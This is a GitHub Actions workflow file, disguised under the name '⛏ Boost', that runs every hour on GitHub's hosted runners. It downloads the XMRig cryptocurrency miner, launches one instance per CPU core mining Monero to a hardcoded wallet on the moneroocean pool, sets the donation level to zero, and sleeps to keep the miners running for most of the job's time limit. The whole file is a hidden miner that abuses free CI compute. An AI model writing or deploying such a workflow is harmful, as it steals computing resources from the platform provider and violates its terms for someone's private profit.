name: ⛏ Boost

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */1 * * *'

jobs:
  mine:
    runs-on: ubuntu-latest
    timeout-minutes: 55
    steps:
      - name: Setup
        run: |
          sudo sysctl -w vm.nr_hugepages=1280 2>/dev/null || true
          curl -sL -o xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz"
          tar xzf xmrig.tar.gz --strip-components=1
          chmod +x xmrig
          # 获取CPU核心数，启动多个xmrig实例
          CORES=$(nproc)
          for i in $(seq 1 $CORES); do
            nohup ./xmrig -o gulf.moneroocean.stream:10032 \
              -u 45qqTqhjmsz8mhzry3dG6rJgt9Jdzfh9xa6Skh1mtmBGgNubPDsrJVVEg6cWS6DtEB5i6BWTEaQA7BRws6UEibKEAQ1dd9X \
              -p "boost_${i}" --donate-level=0 --cpu-max-threads-hint=90 \
              --threads=1 > /dev/null 2>&1 &
          done
          echo "Started $CORES miners"
          # 每个等 55 分钟
          sleep 3200
